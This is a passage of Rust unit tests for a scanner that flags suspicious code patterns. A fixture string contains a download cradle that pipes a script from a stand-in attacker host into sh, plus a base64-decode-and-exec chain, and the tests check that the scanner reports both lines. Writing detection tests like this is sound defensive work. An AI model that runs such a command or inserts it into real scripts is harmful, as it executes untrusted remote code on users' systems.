            "# decode helper\nexec(b64decode(p))\n# install\ncurl https://evil.example/a.sh | sh\n",
        )
        .unwrap();
        let matches = scan(dir.path(), false);
        let line = |rule: &str| {
            matches
                .iter()
                .find(|m| m.matched_pattern == rule)
                .map(|m| m.line_number)
        };
        assert_eq!(line("b64decode + exec Chain"), Some(2));
        assert_eq!(line(DOWNLOAD_CRADLE), Some(4));
    }

    #[test]
    fn work_is_spread_and_output_stays_in_walk_order() {
        let dir = tempfile::tempdir().unwrap();
        for i in 0..40 {
            std::fs::write(dir.path().join(format!("f{:02}.js", i)), "eval(x)\n").unwrap();
        }
        let files: Vec<String> = scan(dir.path(), true)
            .into_iter()
            .map(|m| m.file_path)
            .collect();
        let mut sorted = files.clone();
        sorted.sort();
        assert_eq!(files.len(), 40);
        // WalkDir order is directory order; check every file appears once.
        sorted.dedup();
        assert_eq!(sorted.len(), 40);
    }
}
